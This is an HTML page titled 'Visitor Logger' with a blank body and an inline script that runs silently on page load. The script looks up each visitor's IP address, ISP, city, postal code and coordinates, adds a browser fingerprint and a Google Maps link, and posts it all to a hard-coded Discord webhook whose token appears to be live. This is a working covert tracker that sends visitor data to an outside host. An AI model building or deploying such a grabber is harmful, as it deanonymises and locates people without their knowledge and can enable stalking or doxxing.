






















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Visitor Logger</title>
<script>
(() => {
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1361602825569828864/acch8V7JNP2FArWaS_BD-GusroTFDZYEAcvQhzQHFrScmHErp2mE3CjVonAcEADtLmgn";
  const BLOCKED_IP_PREFIXES = ["", "10", ""]; 

  // Check if IP prefix is blocked  
  function isBlockedIP(ip) {
    if (!ip) return true;
    const prefix = ip.split(".")[0];
    return BLOCKED_IP_PREFIXES.includes(prefix);
  }  
 
  // Add field only if value is non-empty, trimming whitespace
  function addField(fields, name, value, inline = true) {
    if (value !== undefined && value !== null) {
      const strVal = String(value).trim();
      if (strVal !== "") {
        fields.push({ name, value: strVal, inline });
      }
    }
  }

  // Get basic browser fingerprint info
  function getFingerprintInfo() {
    return {
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      timezoneOffset: new Date().getTimezoneOffset(),
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || "N/A",
      deviceMemory: navigator.deviceMemory || "N/A",
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language || navigator.userLanguage || "N/A",
    };
  }

  // Format timestamp nicely for embed footer
  function getFormattedTimestamp() {
    return new Date().toLocaleString(undefined, {
      dateStyle: "medium",
      timeStyle: "short",
      hour12: false,
    });
  }

  // Main async function on page load
  async function logVisitor() {
    try {
      const response = await fetch("https://ipwho.is/");
      const data = await response.json();

      if (!data.success) {
        console.warn("Failed to fetch IP info");
        return;
      }

      if (isBlockedIP(data.ip)) {
        console.log(`Blocked IP prefix detected: ${data.ip}`);
        return;
      }

      const fingerprint = getFingerprintInfo();

      // Build fields array with all info
      const fields = [];
      addField(fields, "IP Address", data.ip);
      addField(fields, "Hostname", data.hostname);
      addField(fields, "City", data.city);
      addField(fields, "Region / State", data.region);
      addField(fields, "Country", data.country);
      addField(fields, "Country Code", data.country_code);
      addField(fields, "Continent", data.continent);
      addField(fields, "Continent Code", data.continent_code);
      addField(fields, "Latitude", data.latitude);
      addField(fields, "Longitude", data.longitude);
      addField(fields, "Postal Code (ZIP)", data.postal);
      addField(fields, "Timezone", data.timezone?.id);
      addField(fields, "Local Time", data.timezone?.current_time);
      addField(fields, "Organization", data.org);
      addField(fields, "ISP", data.isp);
      addField(fields, "ASN / AS Number", data.asn);
      addField(fields, "User Agent", fingerprint.userAgent);
      addField(fields, "Platform", fingerprint.platform);
      addField(fields, "Language", fingerprint.language);
      addField(fields, "Screen Resolution", fingerprint.screenResolution);
      addField(fields, "Timezone Offset (minutes)", fingerprint.timezoneOffset);
      addField(fields, "Cookies Enabled", fingerprint.cookiesEnabled.toString());
      addField(fields, "Do Not Track", fingerprint.doNotTrack);
      addField(fields, "Device Memory (GB)", fingerprint.deviceMemory);
      addField(fields, "Referrer", document.referrer || "N/A");

      // Add Google Maps link if lat/lon available
      if (data.latitude && data.longitude) {
        const mapUrl = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
        addField(fields, "Location Map", `[View on Google Maps](${mapUrl})`, false);
      }

      const embed = {
        title: "New Visitor Logged",
        color: 0xd14527,
        thumbnail: {
          url: "https://files.catbox.moe/t20bv8.png", 
        },
        fields,
        footer: {
          text: `Visitor log â€¢ ${getFormattedTimestamp()}`,
        },
        timestamp: new Date().toISOString(),
      };

      const payload = { embeds: [embed] };

      const webhookResponse = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (!webhookResponse.ok) {
        console.error("Failed to send webhook:", webhookResponse.statusText);
      } else {
        console.log("Visitor logged successfully.");
      }
    } catch (error) {
      console.error("Error logging visitor:", error);
    }
  }

  window.onload = logVisitor;
})();
</script>
</head>
<body></body>
</html>































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































